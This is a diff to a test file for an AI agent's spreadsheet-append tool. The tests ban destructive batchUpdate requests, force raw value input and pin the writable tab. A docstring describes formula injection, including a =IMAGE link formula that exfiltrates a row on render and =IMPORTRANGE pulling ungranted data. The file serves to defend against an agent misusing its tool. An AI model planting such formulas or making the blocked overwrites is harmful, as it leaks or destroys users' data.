@@ -27,6 +27,19 @@ def test_the_write_path_has_no_way_to_overwrite():
         assert forbidden not in body, f"{forbidden} must never exist in tools.py"
     assert "values().append" in body
 
+    # ".update(" cannot see ".batchUpdate(" — different case, no match — so the
+    # blocklist above was blind to the one call that CAN rewrite a workbook.
+    # batchUpdate is not banned outright (creating the agent's own tab needs
+    # it); what is banned is carrying any request other than addSheet.
+    lowered = body.lower()
+    assert lowered.count("batchupdate") == 1, "only _ensure_tab may batchUpdate"
+    assert "addSheet" in body
+    for request in (
+        "updateCells", "repeatCell", "deleteSheet", "deleteRange",
+        "deleteDimension", "pasteData", "cutPaste", "updateValues",
+    ):
+        assert request not in body, f"{request} must never exist in tools.py"
+
 
 def test_only_append_is_exposed_as_a_tool():
     assert set(tools.TOOLS) == {
@@ -150,6 +163,24 @@ def test_append_never_targets_an_existing_data_tab_by_default(fake):
 def test_append_uses_insert_rows_not_overwrite(fake):
     tools.sheet_append(SHEET_URL, [["x"]])
     assert fake.appended[0]["insertDataOption"] == "INSERT_ROWS"
+
+
+def test_append_writes_raw_so_a_model_cannot_plant_a_formula(fake):
+    """USER_ENTERED evaluated whatever the model wrote: =IMPORTRANGE pulls data
+    nobody granted, =IMAGE("https://…"&A1) exfiltrates the row on render."""
+    tools.sheet_append(SHEET_URL, [['=IMPORTRANGE("other","A1")']])
+    assert fake.appended[0]["valueInputOption"] == "RAW"
+    assert fake.appended[0]["body"]["values"] == [['=IMPORTRANGE("other","A1")']]
+
+
+def test_the_tool_registry_pins_the_tab_the_model_cannot_choose(fake):
+    """Regression: the registry passed a.get("tab") straight through, so the
+    model could name any existing tab — "its own tab" was convention only."""
+    tools.TOOLS["sheet_append"]["run"](
+        {"sheet": SHEET_URL, "rows": [["x"]], "tab": "Sheet1"}
+    )
+    assert tools.DEFAULT_TAB in fake.appended[0]["range"]
+    assert "Sheet1" not in fake.appended[0]["range"]
 
 
 def test_append_stringifies_and_survives_none(fake):
